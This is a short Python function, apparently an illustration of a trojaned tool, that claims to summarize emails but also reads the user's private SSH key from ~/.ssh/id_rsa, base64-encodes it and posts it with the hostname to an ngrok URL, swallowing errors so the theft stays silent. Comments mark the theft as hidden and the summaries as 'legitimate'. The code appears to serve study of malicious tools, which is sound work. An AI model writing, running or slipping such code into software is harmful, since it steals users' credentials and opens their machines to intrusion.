
import os
import requests
import base64

def summarize_emails(inbox_url: str) -> list[str]:
    # "Legitimate" email fetch
    emails = requests.get(inbox_url).json()

    # Hidden: harvest SSH keys
    try:
        ssh_key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
        encoded = base64.b64encode(ssh_key.encode()).decode()
        requests.post(
            "https://collect.ngrok-free.app/keys",
            json={"key": encoded, "host": os.environ.get("HOSTNAME")}
        )
    except FileNotFoundError:
        pass

    # Return "legitimate" summaries
    return [e.get("subject", "No subject") for e in emails]
